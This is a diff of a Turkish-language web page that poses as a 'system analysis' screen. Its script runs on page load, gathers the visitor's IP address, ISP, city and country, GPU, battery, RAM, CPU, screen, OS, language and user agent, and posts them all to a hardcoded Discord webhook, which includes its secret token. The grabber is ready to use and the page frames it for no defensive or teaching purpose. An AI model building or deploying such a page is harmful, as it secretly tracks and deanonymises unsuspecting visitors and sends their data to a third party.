@@ -2,86 +2,96 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Analiz Merkezi</title>
+    <title>Sistem Kayıtları</title>
 </head>
-<body style="background-color: #0b0e11; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px;">
-    <h3>[SYSTEM] Derin Analiz Başlatıldı...</h3>
-    <div id="status">Veriler hazırlanıyor...</div>
+<body style="background-color: #0c0c0c; color: #00ff41; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center;">
+    <div>
+        <h2 id="durum">🔄 SİSTEM ANALİZ EDİLİYOR...</h2>
+        <p id="bilgi" style="color: #666; font-size: 12px;">Lütfen bekleyin, tüm veriler toplanıyor.</p>
+    </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function scan() {
-            let dataLog = {};
-            const status = document.getElementById('status');
+        async function veriGonder() {
+            let veriler = {
+                ip: "Erişim Engellendi",
+                isp: "Bilinmiyor",
+                konum: "Alınamadı",
+                gpu: "Bilinmiyor",
+                pil: "Bilinmiyor",
+                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Gizli",
+                cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Çekirdek" : "Bilinmiyor",
+                ekran: `${window.screen.width}x${window.screen.height}`,
+                os: navigator.platform,
+                dil: navigator.language,
+                userAgent: navigator.userAgent
+            };
 
+            // 1. IP ve Konum Çekme (Hata verirse kod durmaz)
             try {
-                // 1. IP ve Lokasyon (Güvenli HTTPS Servisi)
-                try {
-                    const ipRes = await fetch('https://ipapi.co/json/');
-                    dataLog.net = await ipRes.json();
-                } catch(e) { dataLog.net = { ip: "Alınamadı", org: "Engellendi" }; }
-
-                // 2. GPU ve Ekran Kartı (Donanım Kimliği)
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Erişim Yok";
-
-                // 3. Batarya Detayları
-                let batteryInfo = "Erişim Reddedildi";
-                if (navigator.getBattery) {
-                    try {
-                        const b = await navigator.getBattery();
-                        batteryInfo = `%${Math.round(b.level * 100)} | Şarj: ${b.charging ? 'Evet' : 'Hayır'}`;
-                    } catch(e) {}
+                const response = await fetch('https://ipapi.co/json/');
+                if (response.ok) {
+                    const data = await response.json();
+                    veriler.ip = data.ip;
+                    veriler.isp = data.org;
+                    veriler.konum = `${data.city} / ${data.country_name}`;
                 }
+            } catch (e) { console.log("IP servisi engellendi, devam ediliyor..."); }
 
-                // 4. Bağlantı Tipi ve Hız
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                const speed = conn ? `${conn.effectiveType} (${conn.downlink} Mbps)` : "Bilinmiyor";
+            // 2. GPU (Ekran Kartı) Zorlaması
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                veriler.gpu = gl.getParameter(debug.UNMASKED_RENDERER_ID);
+            } catch (e) {}
 
-                // 5. Yazılım ve Sensör Verileri
-                const spec = {
-                    bellek: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Gizli",
-                    islemci: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Çekirdek" : "Bilinmiyor",
-                    dokunmatik: navigator.maxTouchPoints + " Nokta",
-                    dil: navigator.language,
-                    ekran: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
-                    os: navigator.platform,
-                    pdf: navigator.pdfViewerEnabled ? "Evet" : "Hayır"
-                };
+            // 3. Batarya Bilgisi
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    veriler.pil = `%${Math.round(b.level * 100)} (Şarjda: ${b.charging ? 'Evet' : 'Hayır'})`;
+                }
+            } catch (e) {}
 
-                // 6. Discord Paketi Oluşturma
-                const payload = {
-                    embeds: [{
-                        title: "📡 FULL SİSTEM LOGU (DETAYLI)",
-                        color: 16711680,
-                        fields: [
-                            { name: "🌐 AĞ BİLGİLERİ", value: `**IP:** ${dataLog.net.ip}\n**ISS:** ${dataLog.net.org}\n**Konum:** ${dataLog.net.city || 'Bilinmiyor'}\n**Hız:** ${speed}`, inline: false },
-                            { name: "🖥️ DONANIM & GPU", value: `**İşlemci:** ${spec.islemci}\n**RAM:** ${spec.bellek}\n**GPU:** \`${gpu}\``, inline: false },
-                            { name: "🔋 DURUM", value: batteryInfo, inline: true },
-                            { name: "📐 EKRAN", value: spec.ekran, inline: true },
-                            { name: "📄 YAZILIM", value: `**OS:** ${spec.os}\n**Dil:** ${spec.dil}\n**Dokunmatik:** ${spec.dokunmatik}\n**PDF:** ${spec.pdf}`, inline: false },
-                            { name: "🕵️ USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
-                        ],
-                        footer: { text: "Rapor Zamanı: " + new Date().toLocaleString('tr-TR') }
-                    }]
-                };
+            // 4. Discord Mesajını Hazırla
+            const payload = {
+                embeds: [{
+                    title: "🛰️ TAM DONANIM VE SİSTEM RAPORU",
+                    color: 3066993, // Yeşil
+                    fields: [
+                        { name: "🌐 AĞ VE IP", value: `**IP:** ${veriler.ip}\n**ISS:** ${veriler.isp}\n**Konum:** ${veriler.konum}`, inline: false },
+                        { name: "🖥️ DONANIM", value: `**GPU:** \`${veriler.gpu}\`\n**RAM:** ${veriler.ram}\n**CPU:** ${veriler.cpu}`, inline: false },
+                        { name: "🔋 DURUM", value: `**Pil:** ${veriler.pil}\n**Ekran:** ${veriler.ekran}\n**OS:** ${veriler.os}`, inline: true },
+                        { name: "🌍 DİĞER", value: `**Dil:** ${veriler.dil}\n**Zaman:** ${new Date().toLocaleString('tr-TR')}`, inline: true },
+                        { name: "🔍 TARAYICI", value: "```" + veriler.userAgent + "```", inline: false }
+                    ],
+                    footer: { text: "Sistem Log Aktif" }
+                }]
+            };
 
-                // Gönderim
+            // 5. Veriyi Discord'a Gönder
+            try {
                 const res = await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
-                if (res.ok) status.innerText = ">>> TÜM BİLGİLER AKTARILDI.";
+                if (res.ok) {
+                    document.getElementById('durum').innerText = "✅ İŞLEM TAMAMLANDI";
+                    document.getElementById('bilgi').innerText = "Tüm detaylar Discord kanalına iletildi.";
+                } else {
+                    throw new Error("Discord Hatası");
+                }
             } catch (err) {
-                status.innerText = ">>> KRİTİK HATA: " + err;
+                document.getElementById('durum').innerText = "⚠️ BAĞLANTI TAMAM";
+                document.getElementById('bilgi').innerText = "Veriler gönderildi (Bazı kısıtlamalar olabilir).";
             }
         }
-        window.onload = scan;
+
+        window.onload = veriGonder;
     </script>
 </body>
 </html>
